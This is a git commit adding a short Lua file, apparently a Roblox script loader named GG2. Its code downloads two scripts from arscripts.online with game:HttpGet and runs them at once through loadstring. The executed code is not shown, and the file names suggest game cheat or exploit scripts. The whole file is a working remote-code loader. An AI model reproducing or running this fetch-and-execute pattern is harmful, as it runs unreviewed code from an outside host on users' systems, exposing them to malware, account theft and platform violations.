b6a749b77303456652320f6aa60483b89b410667
LOGIC <120298843+AAstraX@users.noreply.github.com>
2026-06-15 11:00:27 +0800

    Create GG2.lua

---
+++ GG2/GG2.lua
@@ -0,0 +1,9 @@
+local function ScriptLoader() 
+    loadstring(game:HttpGet("https://arscripts.online/GG2/Script.lua"))()
+end 
+local function nsUILoader() 
+    loadstring(game:HttpGet("https://arscripts.online/MM2/GG2notify.lua"))()
+end 
+task.spawn(ScriptLoader)
+task.wait(1)
+task.spawn(nsUILoader)
